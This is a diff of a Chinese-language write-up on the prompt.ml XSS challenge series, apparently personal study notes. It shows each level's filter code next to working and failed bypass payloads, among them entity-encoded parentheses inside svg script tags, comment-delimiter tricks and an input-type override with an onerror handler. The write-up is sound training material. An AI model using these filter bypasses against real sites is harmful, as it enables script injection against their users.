@@ -54,7 +54,7 @@ function escape(input) {
 
 `&lpar;`表示（
 
-尝试注入：
+不成功的尝试：
 ```
 <script>prompt`1`</script>
 &lt;script&gt;prompt&#40;1&#41;&lt;/script&gt;
@@ -63,8 +63,7 @@ function escape(input) {
 <img src=1 onerror&#61;prompt`1`>
 
 ```
-
-不成功，但有趣的是注入下列语句能弹出alert：
+但有趣的是注入下列语句能弹出alert：
 
 ```
 <script>alert`1`</script>
@@ -72,10 +71,11 @@ function escape(input) {
 尝试下列成功:
 ```
 <svg><script>prompt&#40;1)</script>
+<svg><script>prompt&#x28;1);</script>
 <script>eval.call`${'prompt\x281)'}`</script>
 ```
 
-## 3
+## 3 
 ```js
 function escape(input) {
     // filter potential comment end delimiters
@@ -102,6 +102,8 @@ function escape(input) {
 1--!><img src=1 onerror="prompt(1)"><!--12
 --!><svg><script>prompt(1);</script>
 ```
+
+看来注释的封闭只需要两个`--`，而不是强制要求`-->`
 
 ## 4
 ```js
@@ -133,3 +135,74 @@ http://prompt.ml%2f@github.com/hhhparty/security/blob/master/courses/webtestguid
 
 
 <script src="https://github.com/HDH-AISEC/HDH-AISEC.github.io/tree/master/projects/atest/prompt.js"></script>
+
+
+这个题还没做出来，可能需要一个公网可访问的网站，访问prompt.js
+
+## 5
+
+题目：
+```js
+function escape(input) {
+    // apply strict filter rules of level 0
+    // filter ">" and event handlers
+    input = input.replace(/>|on.+?=|focus/gi, '_');
+
+    return '<input value="' + input + '" type="text">';
+}      
+```
+
+正则式转义了 `> onxx focus`等为 _。
+
+尝试失败的例子：
+```
+k"&#x3e;<iframe src="javascript:prompt(1)"&#x3e;<img a=" 
+k"&#x3e;<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCg3KTwvc2NyaXB0Pg"&#x3e;<img a=" 
+```
+
+看了别人的writeup，html input 标签的type类型可以有：`button checkbox file hidden image password radio reset submit text`
+通过覆盖type 和 换行来解决过滤。
+
+尝试下列payload成功：
+```
+" type="image" src onerror=
+(prompt(1))
+```
+注意：`<img>` 标签有两个必需的属性：src 属性 和 alt 属性。不写src是不行的。
+
+## 6
+
+```
+function escape(input) {
+    // let's do a post redirection
+    try {
+        // pass in formURL#formDataJSON
+        // e.g. http://httpbin.org/post#{"name":"Matt"}
+        var segments = input.split('#');
+        var formURL = segments[0];
+        var formData = JSON.parse(segments[1]);
+
+        var form = document.createElement('form');
+        form.action = formURL;
+        form.method = 'post';
+
+        for (var i in formData) {
+            var input = form.appendChild(document.createElement('input'));
+            input.name = i;
+            input.setAttribute('value', formData[i]);
+        }
+
+        return form.outerHTML + '                         \n\
+            <script>                                                  \n\
+                // forbid javascript: or vbscript: and data: stuff    \n\
+                if (!/script:|data:/i.test(document.forms[0].action)) \n\
+                    document.forms[0].submit();                       \n\
+                else                                                  \n\
+                    document.write("Action forbidden.")               \n\
+            </script>                                                 \n\
+        ';
+    } catch (e) {
+        return 'Invalid form data.';
+    }
+}        
+```
